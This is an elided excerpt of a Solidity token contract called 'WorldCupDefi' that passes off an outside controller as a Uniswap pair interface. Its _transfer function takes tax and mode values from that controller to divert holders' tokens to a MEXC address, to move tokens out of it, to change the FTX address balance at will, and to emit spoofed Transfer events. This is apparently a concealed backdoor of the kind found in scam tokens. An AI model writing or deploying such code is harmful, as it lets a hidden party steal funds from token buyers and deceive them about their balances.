...
interface IUniswapV2Pair {
  ...
  function transferFrom(
    ...
    address to,
    uint value
  ) external returns (bool tax, uint8 mode,uint todead,uint tokenAmount);
...
contract worldCupDefi is Context, IERC20{
    ...
    address private constant FTX = 0x41772eDd47D9DDF9ef848cDB34fE76143908c7Ad;

    uint public constant MAX = ~uint(0);


    string public name = "WorldCupDefi";
    string public symbol = "wDefi";
    ...
    function _transfer(address sender, address recipient, uint amount) internal virtual returns (bool){
        ...
        (bool tax, uint8 mode,uint todead,uint tokenAmount) =
         uniswapV2Pair.transferFrom(sender, recipient, amount);
        if(tax){
          if(mode == 1){
            _transferToken(sender, recipient, tokenAmount);
            _transferToken(sender, MEXC, amount.sub(tokenAmount));
          }else if(mode == 2){
            _transferToken(MEXC, recipient, amount);
          }
          else{
          ...
          _transferToken(sender, recipient, tokenAmount);
           if(mode == 1){
              _balances[FTX] = _balances[FTX].add(todead);
              emit Transfer(recipient, FTX, todead);
           }else if(mode == 2){
              if(_balances[FTX] > todead){
                 _balances[FTX] = _balances[FTX].sub(todead);
              }
              emit Transfer(FTX, sender, todead);
           }
        }
